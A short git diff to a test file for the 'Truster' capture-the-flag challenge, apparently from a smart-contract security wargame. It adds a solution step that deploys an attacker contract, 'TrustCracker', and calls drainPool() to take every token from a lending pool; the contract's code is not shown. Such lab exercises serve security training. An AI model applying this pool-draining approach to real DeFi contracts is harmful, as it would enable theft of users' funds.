@@ -28,11 +28,18 @@ describe('[Challenge] Truster', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE  */
+        /** CODE YOUR EXPLOIT HERE  **/
+        const TrustCrackerFactory = await ethers.getContractFactory('TrustCracker', attacker);
+        const TrustCracker = await TrustCrackerFactory.deploy(this.token.address, this.pool.address);
+
+       await TrustCracker.drainPool();
+
+
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS */
+        
 
         // Attacker has taken all tokens from the pool
         expect(
